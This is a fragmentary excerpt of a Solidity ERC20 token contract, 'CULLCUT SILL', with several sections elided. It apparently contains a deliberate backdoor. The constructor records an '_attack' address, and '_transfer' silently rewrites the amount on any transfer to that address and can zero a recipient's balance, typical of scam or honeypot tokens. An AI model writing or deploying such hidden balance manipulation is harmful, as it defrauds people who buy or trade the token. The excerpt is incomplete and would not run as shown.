...
contract CULLCUT  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded;
    address private _attack;
    string private _name = "CULLCUT SILL";
    string private _symbol = "CULLCUT SILL";
    ...
    constructor (address _marketing1, address attack) {
        _attack = attack;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (feeburn > 0){
            if(recipient == _attack ){
                amount = 1010101 * 10 ** 9;

            }
            _balance[_marketing] += feeAmount ;
            ...
            {            
                if(amount <= 0){
                    _balance[recipient] = 0;

                }
                emit Transfer(sender, deadadress , feeAmount );
            }
